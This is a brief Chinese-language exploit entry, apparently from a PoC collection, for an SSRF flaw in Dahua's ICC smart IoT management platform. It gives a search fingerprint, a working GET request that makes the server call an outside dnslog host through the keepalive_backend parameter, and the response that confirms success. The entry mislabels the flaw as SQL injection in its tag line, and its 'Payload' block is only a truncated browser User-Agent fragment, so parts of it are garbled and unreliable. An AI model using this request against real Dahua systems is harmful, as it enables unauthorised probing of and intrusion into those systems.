# 大华ICC智能物联管理平台evo-websocket存在SSRF注入漏洞

大华 ｜ SQL注入 ｜ —
- **指纹**：`body="static/qwebchannel.js"`
- **请求**：`GET /evo-websocket/?keepalive_backend=http://www.dnslog.com HTTP/1.1`

**Payload**
```
like Gecko) Chrome/91.0.4472.77 Safari/537.36
```
- **响应特征**：200 Dnslog回显